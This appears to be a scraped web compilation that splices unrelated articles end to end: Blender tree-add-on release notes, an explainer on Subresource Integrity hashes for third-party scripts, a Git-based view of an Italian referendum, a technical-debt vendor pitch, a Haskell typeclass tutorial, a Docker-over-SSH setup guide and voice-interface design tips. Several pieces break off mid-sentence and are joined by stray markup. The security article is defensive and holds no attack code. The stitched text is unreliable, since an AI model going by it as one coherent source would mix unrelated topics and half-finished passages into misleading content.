<p><em>The improvement is two-fold. There’s now almost no smoothing on young branches, which will be the most visible difference. Second, basing the smoothness on thickness now allows to go much more extreme when the branch indeed does get very thick.</em></p>
<h3>Dissolve</h3>
<p>On thicker branches and trunks, nodes that are close together could cause ugly geometry when building the mesh. Dissolve fixes this. It’s done automatically each year, and improves the building of thick trunks by removing excess nodes. More distance between nodes reduces the chance of sudden kinks and improves the smoothness of the trunk.</p>
<h3>Faster</h3>
<p>Talking about mesh building, I optimized it to make it much faster. It turned out that adding data layers took more time than building the mesh itself. So the first easy step was to disable the Age and Dead layers by default. If you need them, you can add them.</p>
<p>Then I optimized the conversion to vertex colors, making that part twice as fast for each layer.</p>
<p>The (internal) branch index layers now build incredibly fast, which by itself shaves off almost half a seconds from building a mature tree. Together, these speed gains add up to a noticeably faster build.</p>
</div>
</div>


<h2>Improvements</h2>
<p><em>Release 9 incorporates changes that stem from your user input. By far, the two most asked questions were how to grow trees at specific spots, and how to make the main branches thicker. These two things have been made much easier.</em></p>
<div>
<div>
<h3>Plant</h3>
<p>A question I get often is how to grow multiple trees together, and from specific locations? You could do so by adding empty objects that mark the locations. It’s been there forever, but not many users knew about it.</p>
<p>To un-hide this feature, and hopefully make it used more often, The Grove now starts with an empty object at the scene origin. This has the same effect as before, but I’m hoping that the visible arrow will invite users to move it around and experiment.</p>
<p>You can duplicate it, delete it and point it in any direction of your liking. Then Restart or Regrow to grow from the new locations.</p>
<p><img loading="lazy" src="https://www.thegrove3d.com/wp-content/uploads/2020/03/Plant.jpg" alt="" width="1280" height="528"></p>
<p>I also added the <em>Plant</em> operator. It’s a simple button that adds an empty object to your grove collection. You can easily do the<br>
Same with <em>Add &gt; Empty &gt; Single Arrow</em>. But again, I’m trying to promote this feature. And there’s a little extra: repeatedly click<br>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <h2 id="security-problems-with-loading-scripts">Security problems with loading scripts</h2> <p>Whenever a site loads a Javascript via a <code>&lt;script&gt;</code> tag, it gives it free rein on the page. It can <strong>read and modify the contents, make HTTP requests, store and read some cookies, access the local storage and local databases</strong>, and can use all features that the page <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Feature-Policy">has access to</a>.</p> <p>This is not a problem for scripts hosted on the same domain, but it gives the same <strong>enormous capabilities to scripts loaded from third-party websites</strong>.</p> <p>For example, you might want to host jquery on cdnjs instead of your own domain. This script tag loads the library code from the remote server:</p> <div><div><pre><code><span>&lt;script </span><span>src=</span><span>"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"</span><span>&gt;&lt;/script&gt;</span>
</code></pre></div></div> <p>Checking the site shows that jquery is loaded, and adding a simple script tag is definitely an easier option to setting up some sort of dependency management. <strong>But how do you know that cdnjs will always send jquery unmodified in the future?</strong> It might choose to include some malware, for example, a cryptocurrency miner script, an attack called cryptojacking (there is a detailed article on how that works <a href="https://www.varonis.com/blog/cryptojacking/#mechanics">here</a>).</p> <p>This is not a theoretical problem. In 2018 a plugin called Browsealoud was <a href="https://www.theregister.com/2018/02/11/browsealoud_compromised_coinhive/">hacked</a> and <strong>its script that was loaded on a ton of websites started mining cryptocurrency for the hackers</strong>. In this case, it was only for direct financial gains, but the injected script could do a lot more damage.</p> <p>More recently, in 2020, Twilio suffered a <a href="https://www.twilio.com/blog/incident-report-taskrouter-js-sdk-july-2020">similar attack</a> where they left open their S3 bucket that hosted their script to be world-writable and somebody came and overwrote it. <strong>Every site that used that script was immediately compromised.</strong></p> <p> We write articles like this regularly. <a href="#" data-toggle="modal" data-target="#email-promo-popup">Join our mailing list</a> and let's keep in touch. </p> <h2 id="sri-hash">SRI hash</h2> <p>SRI (Subresource Integrity) is a feature that aims to solve this problem. It’s been available since mid-2015 and gained <a href="https://caniuse.com/subresource-integrity">universal support</a> in early 2019. It works by adding an <code>integrity</code> tag to the resource which the browser checks during the download.</p> <p>This is the jquery script with SRI added:</p> <div><div><pre><code><span>&lt;script
	</span><span>src=</span><span>"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"</span>
	<span>integrity=</span><span>"sha512-bLT0Qm9VnAYZDflyKcBaQ2gg0hSYNQrJ8RilYldYQ1FxQYoCLtUjuuRuZo+fjqhx/qtq/1itJ0C2ejDxltZVFg=="</span>
	<span>crossorigin=</span><span>"anonymous"</span>
<span>&gt;&lt;/script&gt;</span>
</code></pre></div></div> <p>The <code>integrity</code> is the <em>hash of the content</em>. <strong>When the browser downloads the file, it checks if it matches the hardcoded value</strong> and rejects the script if not. As a result, if the file does not match the expected content, it won’t load and an error appears on the console:</p> <div><div><pre><code>Failed to find a valid digest in the 'integrity' attribute for resource
'https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js' with
computed SHA-256 integrity '9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0='.
The resource has been blocked.
</code></pre></div></div> <p>Note that the reliability of your site is still tied to the CDN. If it is down or compromised, then the resource you need won’t load, possibly affecting functionality. SRI hashes only help with stopping the attack.</p> <h3 id="how-to-use-sri-hashes">How to use SRI hashes</h3> <p>Some CDNs, such as cdnjs automatically include the <code>integrity</code> attribute when you copy the script tag. This makes using it the default.</p> <p>If you need to generate the hash for a resource, <a href="https://www.srihash.org/">srihash.org</a> is an easy-to-use site. Just drop the URL, click “Hash!” and copy-paste the resulting tag.</p> <p>If you need to script it, use OpenSSL:</p> <div><div><pre><code>openssl dgst <span>-sha384</span> <span>-binary</span> FILENAME.js | openssl <span>base64</span> <span>-A</span>
</code></pre></div></div> <h2 id="the-problem-with-sri">The problem with SRI</h2> <p>In which cases you can’t use the <code>integrity</code> attribute? <strong>When the resource is not immutable, specifying the hash breaks when there is an update.</strong> For example, if you use Google Analytics, you are likely to use the <code>ga.js</code> or the <code>analytics.js</code> script to load it on the page. These are not versioned files, and Google updates them from time-to-time.</p> <p>While it’s possible to download the file and host it on your server, effectively freezing it in a version, it is actively <a href="https://support.google.com/analytics/answer/1032389?hl=en">discouraged</a> in the official documentation:</p> <blockquote> <p>While it’s possible to download the JavaScript file (gtag.js) to examine it, storing or serving the JavaScript file locally is not recommended.</p> <p>Referencing the JavaScript file from Google’s servers (i.e., https://www.googletagmanager.com/gtag/js) ensures that you get access to new features and product updates as they become available, giving you the most accurate data in your reports.</p> </blockquote> <p>And who doesn’t want new features and product updates as they become available?</p> <p>But the problem is not the lack of “new features” but the <strong>missing guarantee that the old version of the script <em>will work in the future</em></strong>. Since Google controls both the script and the analytics backend, <strong>it can make backward-incompatible changes</strong>. With jquery, it is guaranteed that a given version won’t change. With a script like <code>ga.js</code> and <code>analytics.js</code>, there is no such guarantee.</p> <p>And it’s not unique to Google. When you include the Facebook SDK, it also <a href="https://developers.facebook.com/docs/javascript/quickstart">needs you</a> to do it as a mutable file, as well as a ton of other service providers.</p> <p>These are similar problems to what <a href="https://advancedweb.hu/how-i-failed-to-implement-csp/">I experienced with CSP</a>, another security feature that gives websites more control over what the browser allows on the page.</p><div> <p> Related </p> <div> <p><a href="https://advancedweb.hu/how-i-failed-to-implement-csp/"> <img integrity="sha256-LgYXTHf1Wrht0a93R6nvOcTVFdimNNIN26qt3rhA9ME=" crossorigin="anonymous" src="https://advancedweb.hu/assets/6da855-479feb3d16093767c1b4814a38af651b48ebbb2a72f69ef7f5934c1ee23f0cfc.jpg"> </a> </p> <div>  <p> Lessons learned from adding Content Security Policy to a simple site </p> </div> </div> </div> <p>The solution?</p> <p>Unfortunately, there is none. If the provider does not provide an immutable, versioned file, you can’t do anything about it. Either way, you’ll introduce problems, either by potentially breaking functionality or by introducing supply-chain vulnerabilities.</p> <h2 id="conclusion">Conclusion</h2> <p>SRI is a powerful tool to prevent a very real problem. With a simple tag property, you can make sure that if you include scripts from other sites, even if those sites are compromised you won’t suffer a security incident.</p> <p>But unfortunately, this only works for immutable resources. When a script file is expected to change, you can’t pinpoint a fixed version. This makes SRI not possible in these cases.</p> </div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p>In Italy, in the 20th and the 21st of September 2020, there will be a 
<a href="https://en.wikipedia.org/wiki/2020_Italian_constitutional_referendum">constitutional referendum</a>
to change the <a href="https://en.wikipedia.org/wiki/Constitution_of_Italy">Constitution of the Italian Republic</a> 
about the reduction of the number of eligible members of Parliament.
In particular, for the Chamber of Deputies from 630 to 400 components, and 
for the Senate from 315 to 200.</p>

<p>
  <a href="https://en.wikipedia.org/wiki/2020_Italian_constitutional_referendum">
    <img alt="Referendum." src="https://marcofavorito.me/assets/posts/visualize-referendum-changes/referendum.jpeg">
  </a>
</p>

<p>As you might expect, all the news and the media talked about it 
more or less incessantly in the few weeks before the voting days. 
However, most people don’t check <em>what</em> changed in the Constitution. 
Of course, it is not a particular issue in this specific case, since 
the changes are quite minimal, and a voter should be more interested 
into the consequences that a reform brings, rather than the actual words, 
that might be too technical to appreciate them. Nevertheless, 
I believe it should be good practice for the “modern citizen”.</p>

<p>I decided to improve the accessibility to the changes and, being a software engineer, 
my first thought was to use the most successful version control system: 
<a href="https://git-scm.com/">Git</a>. The process
of changing the text of the laws might be roughly mapped into 
the famous <a href="https://nvie.com/posts/a-successful-git-branching-model/">Git Workflow</a>:</p>
<ul>
  <li>on <code>master</code>, the current active version of the law;</li>
  <li>on other <code>branches</code>, the work-in-progress for specific topics;</li>
  <li>branching off from topic branches would be like amendments on the associated topic;</li>
  <li>pull requests are proposals to apply the changes to the main text (only on GitHub though).</li>
</ul>

<p>Nowadays, the development of a reform is discussed in the Parliament; 
however, would be interesting to keep track of all the changes made 
during the discussion, and it would be much easier to analyze and verify 
for all the citizens. It would surely make easier the task of accountability (who did what).</p>

<p>I tested the approach for the incoming referendum. 
<a href="https://github.com/marcofavorito/costituzione-della-repubblica-italiana">In this repo</a>,
you will find the text of the Constitution (in <code>txt</code> format) 
and an open <a href="https://github.com/marcofavorito/costituzione-della-repubblica-italiana/pull/1">pull request</a>
with the changes proposed by the proposed reform (ID <code>19A06354</code>).
The changes are taken from the <a href="https://www.gazzettaufficiale.it/eli/id/2019/10/12/19A06354/sg">official source “Gazzetta Ufficiale”</a>.</p>

<p>

    <img alt="Changes introduced by the 2020's constitutional reform." src="https://marcofavorito.me/assets/posts/visualize-referendum-changes/changes.png">
  </a>
</p>

<p>Potential future work:</p>
<ul>
  <li>automatize the process using NLP techniques to extract the proposed changes;</li>
  <li>define a canonic form for the law text (e.g. each line must have a maximum length etc.)</li>
  <li>being more formal in the namings and formats (<a href="https://en.wikipedia.org/wiki/IANAL">IANAL</a> :D)</li>
</ul>

                    <p>There are many ways in which technical debt costs us money: lost deals, customer churn, employee churn, lawsuits, and more. However, there are a couple of issues that are more important than others: engineering time, morale, and the missed revenue from software delays.</p><p><strong>Engineering time</strong></p><p>The cost of engineering time is quite simple:</p><blockquote>Engineers spend 33% of their time dealing with technical debt.</blockquote><p><a href="https://stripe.com/files/reports/the-developer-coefficient.pdf"><em>The Developer Coefficient</em></a><em> (Stripe)</em></p><p>On average, developers spend 41.1 hours at work each week, 13.4 hours of which they spend on technical debt. Maintenance of legacy systems and technical debt is the number one cause for productivity loss.</p><figure><img src="https://lh5.googleusercontent.com/2xw9ZH3csKzbygxjHYcs4vpnOPxsDktLw0L9zqnk2JULrwhV7aRgTWRcb6IbOndokfcGeCElL4cF5AuSt95HIoNAzV9AHiMR3y-qdEl812agPT5jTvN-gqqNxT8jzwEWPoCvwIkF" alt=""></figure><p><em>Image from <a href="https://stripe.com/files/reports/the-developer-coefficient.pdf">The Developer Coefficient</a> (Stripe)</em></p><p>Think of it like this: if you pay your software engineers $100k, 33% of that goes towards dealing with technical debt. For a 50-person engineering team, that 33% is $1.65M/year.</p><p>Stripe estimates technical debt alone has a $3 trillion impact on global GDP.</p><p><strong>Delayed software product releases</strong></p><p>The effect of delayed product releases on monthly recurring revenue (MRR) is another aspect that is worth diving into. Let's quickly run through two scenarios where the monthly revenue growth rate remains constant at 15%, and the MRR secured on launch is $5k:</p><ol><li>The product launches in February (month 2 in the chart below)</li><li>The product launches in April (month 4 in the chart below)</li></ol><figure><img src="https://lh6.googleusercontent.com/IRgIRulofTucgSFq1GimEsGbFXg2sYNgb6QSKaXIYczqgKF1OK7udJzB_FI0nKPo2yZBVVQNwS88l04H3FicZc-RIggDFdm3bX1vFILQesFeKl0nsfBUltbKXk-I12yx8SSn2Q_5" alt=""></figure><p>Shipping a mere two months later will cost our business 25% of the revenue we could've made over this selected period. MRR on month 24 would've been over 30% higher if we'd shipped just two months earlier and managed to maintain that shipping pace.</p><p>These figures are make-or-break for high-growth SaaS companies.</p><p>As Martin Fowler explains, a healthy codebase results in features being shipped faster, so it is crucial for engineering teams to have the purview to continuously manage technical debt as they build the product.</p><p><strong>Key takeaways</strong></p><p>Companies need to identify key pieces of tech debt that get in the way of key goals, cost countless engineering hours in productivity losses, or are the root cause for bugs and other issues that impact the customer experience. But most companies remain blissfully unaware of that and bear the enormous costs of tech debt without even realising it.</p><p>To fix that, engineering teams need a clear understanding of the strategy and metrics for technical debt.</p><blockquote>By 2023, I&amp;O leaders who actively manage and reduce technical debt will achieve at least 50% faster service delivery times to the business.</blockquote><p><a href="https://www.gartner.com/en/publications/how-to-assess-infrastructure-technical-debt-to-prioritize-legacy-modernization-investments">Gartner’s research</a> basically says that companies who have a strategy for technical debt will ship 50% faster.</p><p>Luckily, Stepsize can help you out.

</blockquote>
<p>Haskell is my favorite programming language, but it is not simple—a language with a strong static type system and non-strict semantics is one that must deal in subtlety and nuance. However, typeclasses, one of Haskell’s most fundamental features, admit a surprisingly-simple implementation, one drastically simpler than the corresponding features of ALGOL-style scripting languages. This piece aims to be a brief, high-level overview of how typeclasses are resolved at compile-time, how they’re invoked at runtime, and how the <code>-XTypeApplications</code> extension to GHC provides a more granular approach for such resultion, one that enables sophisticated and subtle APIs in real-world problems.</p>

<p>A computer program is a conversation between a human and a machine. A limited conversation, yes, and one often marred by profanity and frustration, but one informed in structure and style by human language, both the languages with which we communicate with our fellow humans and the inner language with which we organize our thoughts. One of the defining features of human language is the ability for one word to mean many things: one signifier, many referents. We can fix a car, we can fix a breakfast, and we can fix an election—though these activities are substantially different, the speakers of English have collectively decided that there is an underlying similarity between them, and that the word ‘fix’ captures this similarity, giving us one versatile word rather than three<span><label for="sn-0"></label><span>The Oxford English Dictionary <a href="https://www.nytimes.com/2011/05/29/opinion/29winchester.html">asserts</a> that the word ‘run’ has the most definitions of any word in the language; the verb alone has 645 meanings. If every such meaning were given its own word, it would take more than four months to learn them all, assuming that the average person can learn ~5 words per day.</span></span> situation-specific ones. In other words, spoken language provides <em>polysemy</em>–the ability for a word or phrase to refer to different things based on context. Wordplay, metaphor, simile, metonymy, synecdoche: language, and by extension the whole of human thought, delights in polysemy’s nuance.</p>
<p>In programming, we refer to this phenomenon as <em>polymorphism</em>. Computers, in contrast with humans, do not delight in polymorphism. Resolving the meaning of a polymorphic statement entails choice, and computers are notoriously bad at making correct choices in the absence of human supervision. But effective use of polymorphism is often, if not always, at the heart of well-written code, so nearly all programming languages<span><label for="sn-1"></label><span>Even C has <code>_Generic</code> macros now, which provide a form of compile-time polymorphism.</span></span> provide means for polymorphism. Because teaching computers to make predictable, sensible choices is a complicated prospect, most programming languages use complicated systems to resolve polymorphism:</p>
<ul>
<li>Python’s object system, providing Simula-style<span><label for="sn-2"></label><span>Unless you use <code>@property</code>, which is much closer to the Smalltalk school of thinking than Simula.</span></span> object-orientation with multiple inheritance, uses <a href="https://en.wikipedia.org/wiki/C3_linearization">C3 linearization</a> to resolve a method invoked on an object.</li>
<li>Ruby’s object system, a weird hybrid of Smalltalk-style class-based OO and Self-style prototypical OO, provides <a href="https://gist.github.com/damien-roche/351bf4e7991449714533">its own algorithm</a>, one capable of expressing sophisticated, if oft-surprising, polymorphism.</li>
<li>Common Lisp, in keeping with its ethos of flexibility, provides an object system in which the resolution of polymorphism is entirely customizable at runtime. There’s a <a href="https://www.amazon.com/Art-Metaobject-Protocol-Gregor-Kiczales/dp/0262610744">whole book</a> about this.</li>
</ul>
<p>Haskell is different. For all its reputation for being a language that is difficult to learn<span><label for="sn-3"></label><span>(a reputation that is sometimes unfair and sometimes extremely well-deserved)</span></span>, its system for providing polymorphism is simple, so simple that when I first learned of it I felt vaguely cheated in some way. Let’s take the notion of equality–<code>(==)</code>, one of the most common polymorphic functions–and explore how Haskell represents that, both to the programmer and within its runtime system. (If you’re already fluent in Haskell and familiar with dictionary-passing style, you might want to skip ahead to the next section, in which I start playing around with explicit type applications.)</p>

<p>Polymorphism is a great and necessary thing, but how should a compiler or interpreter implement it? From an object-oriented perspective, in which code and data are intertwined, the most straightforward solution to provide is to have some sort of lookup table (usually called a ‘vtable’, C++ argot for ‘virtual method table’) present in the in-memory layout of a given object. Due to the fact that Haskell lacks objects but possesses a strong type system, vtables become unnecessary: the target of polymorphic calls is <em>always</em> resolvable at compile time. If, at compile time, your program contains a type variable that cannot be resolved, GHC rejects the program with an error.</p>
<p>Let’s take a look at one of Haskell’s most fundamental typeclasses and the mechanisms with which GHC compiles this typeclass into its intermediate language, which lacks typeclasses.</p>
<div id="cb1"><pre><code><span id="cb1-1"><span>class</span> <span>Eq</span> a <span>where</span></span>
<span id="cb1-2"><span>  (==) ::</span> a <span>-&gt;</span> a <span>-&gt;</span> <span>Bool</span></span></code></pre></div>
<p>Haskell’s equality operator is implemented atop the <code>Eq</code> typeclass. Even if you don’t speak Haskell, this should look reasonably familiar if you’ve ever looked at <code>Equatable</code> in Java or IEquatable in C#.</p>
<p>This interface provides a polymorphic function <code>(==)</code>, one that compares two values (of the same type) for equality. It is polymorphic in one type variable, <code>a</code> in the above declaration. We can use this function over any type that implements the <code>Eq</code> interface, as long as <code>a</code> can be resolved, at some point, to a concrete type like <code>Int</code> or <code>String</code>. We can write a useful function with <code>Eq</code>.</p>
<div id="cb2"><pre><code><span id="cb2-1"><span>allEqual ::</span> <span>Eq</span> a <span>=&gt;</span> [a] <span>-&gt;</span> <span>Bool</span></span>
<span id="cb2-2">allEqual []       <span>=</span> <span>True</span></span>
<span id="cb2-3">allEqual (h<span>:</span>rest) <span>=</span> <span>all</span> (<span>==</span> h) rest</span></code></pre></div>
<p>Here we define an <code>allEqual</code> function that is polymorphic in its argument, taking a list of any values implementing <code>Eq</code>. The <em>constraint</em>, on the left-hand-side of the <code>=&gt;</code>, introduces a type variable named <code>a</code>, corresponding to a given type that implements the <code>Eq</code> class. (We call this a ‘constraint’ because it constrains the set of types that this function will accept.)</p>
<p>Here’s the secret to Haskell’s implementation of polymorphism: <strong>during compilation, GHC turns that <code>=&gt;</code> into an <code>-&gt;</code>.</strong> That’s right: a constraint on a function becomes a parameter to that function<span><label for="sn-4"></label><span>An interesting consequence of this is that you can use <code>=&gt;</code> in more than one place in a type signature: the signatures <code>Ord a =&gt; Ord b =&gt; a -&gt; b -&gt; Bool</code> and <code>(Ord a, Ord b) =&gt; a -&gt; b -&gt; Bool</code> are equally valid.</span></span>. <code>allEqual</code> is a function that takes one argument, but from the runtime’s perspective it takes two. This new argument is called a <em>dictionary</em>, and the under-the-covers application of dictionaries to polymorphic functions is called <em>dictionary-passing style</em><span><label for="sn-5"></label><span>Because GHC’s type system is significantly more featureful than the type system specified in the Haskell Report, the details of its typeclass resolution are a bit more complicated—things like type families introduce subtleties to the dictionary-passing approach. You could, however, sit down and implement your own Haskell2010 compiler with dictionary-passing style.</span></span>.</p>
<div id="cb3"><pre><code><span id="cb3-1"><span>data</span> <span>EqDict</span> a <span>=</span> <span>EqDict</span> {<span> dictEqual ::</span> a <span>-&gt;</span> a <span>-&gt;</span> <span>Bool</span> }</span></code></pre></div>
<p>Under the dictionary-passing model, this typeclass is represented in a manner similar to this Haskell data type—a data structure, parameterized in terms of an input type, that holds references to concrete implementations of the methods referenced in the typeclass.</p>
<p>When types are correctly resolved, an <code>EqDict Int</code> dictionary will contain in its <code>dictEqual</code> field the correct implementation of <code>==</code> for <code>Int</code> values. <em>If, during compilation, a polymorphic type cannot be instantiated or inferred to be a concrete type, typechecking will fail.</em> This is the source of the dreaded <code>Ambiguous type variable</code> error from GHC: if a given type variable cannot be resolved to a concrete type, we can’t build an <code>EqDict</code> for it, since we don’t know how to fill in the <code>dictEqual</code> field.</p>
<p>This has some resemblance to vtables from object-oriented language, but there’s a crucial difference: though a data type may implement <code>Eq</code>, there is no <code>EqDict</code> carried around within its in-memory representation. Though an <code>Int</code> may implement dozens of different interfaces, I can pass them around as data and data alone: polymorphism is <em>provided at call-sites</em>, not shoehorned into data structures themselves.</p>
<p>Let’s consider how this would look if Haskell didn’t have typeclasses:</p>
<div id="cb4"><pre><code><span id="cb4-1"><span>allEqualDictionary ::</span> <span>EqDict</span> a <span>-&gt;</span> [a] <span>-&gt;</span> <span>Bool</span></span>
<span id="cb4-2">allEqualDictionary dict [] <span>=</span> <span>True</span></span>
<span id="cb4-3">allEqualDictionary dict (h<span>:</span>rest) <span>=</span> <span>all</span> ((dictEqual dict) h) rest</span></code></pre></div>
<p>This function is equivalent in functionality to our previous one, but we’d have to build an <code>EqDict</code> every time we invoked the <code>(==)</code> function, which is both tedious and inefficient. GHC takes care of this for us.</p>
<p>That’s it. No fancy algorithm, no superclasses or metaclasses or prototypes, no vtables attached to data structures, no runtime type inference. Just a record type for every typeclass. Remarkable.</p>

<p>I mentioned that GHC will reject programs in which it cannot infer a concrete type for every type variable. So what do you do if GHC can’t infer which type to use (or, in other words, which dictionary to pass)? Well, the simplest option is to use an inline type signature.</p>
<div id="cb5"><pre><code><span id="cb5-1"><span>let</span> tenThousand <span>=</span> <span>10000</span><span> ::</span> <span>Integer</span></span>
<span id="cb5-2"></span>
<span id="cb5-3"><span>-- Ambiguous: it's unclear which 'Num' instance to return from fromIntegral.</span></span>
<span id="cb5-4"><span>print</span> (<span>fromIntegral</span> tenThousand)</span>
<span id="cb5-5"></span>
<span id="cb5-6"><span>-- Unambiguous: by narrowing the 'Num' instance to that of 'Word32', we</span></span>
<span id="cb5-7"><span>-- know which Num and Show instances to use.</span></span>
<span id="cb5-8"><span>print</span> (<span>fromIntegral</span><span> tenThousand ::</span> <span>Word32</span>)</span></code></pre></div>
<p>If we have some constraint–<code>Eq a</code>, let’s say–we can, with a type signature, specify an explicit, rather than inferred, type …</p></section></article></div></div>

<p data-preserve-html-node="true">We left off at booting an ARM Linux virtual machine, and installing &amp; running Docker inside it. This works fine and allows you run containers like for instance a Postgres database. They can expose their ports and instead of connecting to <code data-preserve-html-node="true">localhost:5432</code> on the host, you connect to your VM’s IP address, for instance <code data-preserve-html-node="true">192.168.64.8:5432</code>.</p>

<p data-preserve-html-node="true">Now in case you’re not aware, Docker is actually a service that exposes an API over HTTP and when you run <code data-preserve-html-node="true">docker</code> commands, they control the service via these API requests on a local socket. You’ve probably seen the reference to <code data-preserve-html-node="true">unix:///var/run/docker.sock</code> at times.</p>

<p data-preserve-html-node="true">What that means is that it’s possible to direct your <code data-preserve-html-node="true">docker</code> client to talk to a Docker service over the network, and that’s what we can do as well to enable “regular” docker commands to work with a locally running “Linux Docker VM”.</p>

<p data-preserve-html-node="true">Incidentally, that’s exactly what “Docker for Mac” is doing under the hood: it is actually a <a data-preserve-html-node="true" href="https://github.com/moby/hyperkit">VM based on Apple’s Hypervisor framework</a> which hosts Docker, not your Mac itself.</p>

<h2 data-preserve-html-node="true">Installing “Docker for Mac”</h2>

<p data-preserve-html-node="true">In order to get started, we need to obtain the Docker client app. I migrated my existing setup from a Time Machine backup and therefore had Docker installed from the start. If you need to install from scratch, <a data-preserve-html-node="true" href="https://docs.docker.com/engine/install/binaries/">installing the client binaries</a> is probably the easiest way to get started.</p>

<p data-preserve-html-node="true">Assuming you have a <code data-preserve-html-node="true">docker</code> binary to hand, you’re good to go. The way we’ll set up the connection is via a “docker context” and all this is <a data-preserve-html-node="true" href="https://twitter.com/johannesweiss/status/1332271974719090688?s=21">thanks to a tip by Johannes Weiss</a>.</p>

<h2 data-preserve-html-node="true">Setting up SSH in virtual machine</h2>

<p data-preserve-html-node="true">First though, we need to configure to connect to our VM via SSH. Install the SSH server:</p>

<pre data-preserve-html-node="true"><code data-preserve-html-node="true">sudo apt-get install openssh-server</code></pre>

<p data-preserve-html-node="true">and copy your public key to the <code data-preserve-html-node="true">ubuntu</code> user’s <code data-preserve-html-node="true">authorized_keys</code> for password-less access.</p>

<p data-preserve-html-node="true">In order to connect to the VM, you’ll need to find its IP address (which is on a <code data-preserve-html-node="true">192.168.64.0</code> network if you’ve followed along from the previous blog post).</p>

<p data-preserve-html-node="true">Our image comes without <code data-preserve-html-node="true">net-tools</code>, so we’ll install these first:</p>

<pre data-preserve-html-node="true"><code data-preserve-html-node="true">sudo apt install net-tools</code></pre>

<p data-preserve-html-node="true">and then run</p>

<pre data-preserve-html-node="true"><code data-preserve-html-node="true">ifconfig <span>|</span> grep 192.168</code></pre>

<p data-preserve-html-node="true">which should yield the following</p>

<pre data-preserve-html-node="true"><code data-preserve-html-node="true"><a href="https://finestructure.co/cdn-cgi/l/email-protection" data-cfemail="4f3a2d3a213b3a0f3a2d3a213b3a">[email&nbsp;protected]</a>:<span>~</span>$ ifconfig <span>|</span> grep 192.168
        inet 192.168.64.8  netmask 255.255.255.0  broadcast 192.168.64.255</code></pre>

<p data-preserve-html-node="true">With all this out of the way, we can test the connection from the host:</p>

<pre data-preserve-html-node="true"><code data-preserve-html-node="true">ssh <a href="https://finestructure.co/cdn-cgi/l/email-protection" data-cfemail="403522352e3435007179726e7176786e76746e78">[email&nbsp;protected]</a></code></pre>

<figure data-preserve-html-node="true"><img data-preserve-html-node="true" src="https://f000.backblazeb2.com/file/finestructure-public-images/posts/ssh-login.png"></figure>

<h2 data-preserve-html-node="true">Setting up a Docker context</h2>

<p data-preserve-html-node="true">The remaining steps are simple. We create a Docker context:</p>

<pre data-preserve-html-node="true"><code data-preserve-html-node="true">docker context create myvm --docker <span>"host=ssh://<a href="https://finestructure.co/cdn-cgi/l/email-protection" data-cfemail="730611061d070633424a415d42454b5d45475d4b">[email&nbsp;protected]</a>"</span></code></pre>

<p data-preserve-html-node="true">and tell Docker to use it</p>

<pre data-preserve-html-node="true"><code data-preserve-html-node="true">docker context use myvm</code></pre>

<p data-preserve-html-node="true">Now all docker commands are targeting the virtual machine, just like they do in Docker for Mac.</p>

<pre data-preserve-html-node="true"><code data-preserve-html-node="true">❯ docker context create myvm --docker <span>"host=ssh://<a href="https://finestructure.co/cdn-cgi/l/email-protection" data-cfemail="304552455e4445700109021e0106081e06041e08">[email&nbsp;protected]</a>"</span>
myvm

<span>~</span>
❯ docker context use myvm
myvm

❯ docker ps

❯ docker run hello-world

Hello from Docker<span>!</span>
This message shows that your installation appears to be working correctly.

To generate this message, Docker took the following steps:
 1. The Docker client contacted the Docker daemon.
 2. The Docker daemon pulled the <span>"hello-world"</span> image from the Docker Hub.
    (arm64v8)
 3. The Docker daemon created a new container from that image which runs the
    executable that produces the output you are currently reading.
 4. The Docker daemon streamed that output to the Docker client, which sent it
    to your terminal.

To try something more ambitious, you can run an Ubuntu container with:
 $ docker run -it ubuntu bash

Share images, automate workflows, and more with a free Docker ID:

<p data-preserve-html-node="true">You can find out more about <code data-preserve-html-node="true">docker context</code> in the <a data-preserve-html-node="true" href="https://docs.docker.com/engine/context/working-with-contexts">online documentation</a>.</p>

<p data-preserve-html-node="true">Bear in mind that this setup does not come with the convenience of Docker for Mac’s bridge networking or support for volumes – but surely these aren’t far off.</p>

A voice interface can be thought of a controller for app actions which makes it <a href="https://www.speechly.com/blog/voice-user-interfaces-for-react/">retrofittable to an existing application</a>.</p><p>We contrast this approach to now-popular voice assistants like Apple’s Siri, Google Home and Amazon Alexa, which are conversational in nature and are typically optimized for generic hands-free use with voice.</p><h2>Setting the right context</h2><h3>1. Don't try to build a voice assistant</h3><p>Voice assistants are digital assistants that react to voice commands, most often by using voice themselves, too. While there are good use cases for voice assistants, their way of using voice is not suitable for touch screen devices.</p><p>Instead of question-answer based dialogues, touch screen voice experiences should be based on real-time visual feedback. As the user speaks, the user interface should be instantaneously updated.</p><h3>2. Users don’t want to converse</h3><p>When we humans talk with each other, we do more than transmit information by using words. We might greet, persuade, declare, ask or apologize and even the same words can have a different meaning, depending on how we say it and in which situations. This is very human-like, but not the way we want to communicate with a computer.</p><p>With voice user interface, speech has only one function and it is to command the system to do what the user wants. Be clear that the user is talking with a computer, don’t try to imitate a human. In most cases, the application should not answer in natural language. It should react by updating the user interface, just like when clicking a button.</p><h3>3. Give visual guidance on what the user can say</h3><p>An issue commonly described in voice user interfaces (VUI) users is the uncertainty related to what commands are supported.</p><p>The problem arises from the fact that the typical voice assistant experience begins from a blank slate, where the assistants start listening and is expected to be able to help the user with pretty much anything. This is of course not really true as anybody who has tried these services understands.</p><p>Understanding the supported functionality with traditional graphical user interfaces (GUI) is less of a problem. Placing a button in the users shopping cart that reads “proceed to checkout” is a very strong signal to the users that checkout is supported and by pressing the button the user will indeed proceed to the checkout process. This aspect is missing from voice-only solutions which cases uncertainty in terms of supported features.</p><p>This is why a good voice user interface should be supported if possible by a graphical user interface.</p><p>Booking air flights - Graphical user interface supporting the voice user interface</p><h3>4. Use voice for the tasks it is good for</h3><p>Good design is about providing the user with the best tools for their use task.</p><p>Voice works great for use tasks such as <a href="https://www.speechly.com/blog/voice-search/">search filtering</a> – “Show me the nearest seafood restaurants with three or more stars”, accessing items from a known inventory – “Add milk, bread, chicken and potatoes”, inputting information: “Book a double room for two in Los Angeles next Friday” and unambiguous commands, such as “Show sports news”.</p><p>On the other hand, touch is often the better option for selecting from a couple of options, typing things such as email addresses and passwords and browsing by scrolling a large unknown inventory, for 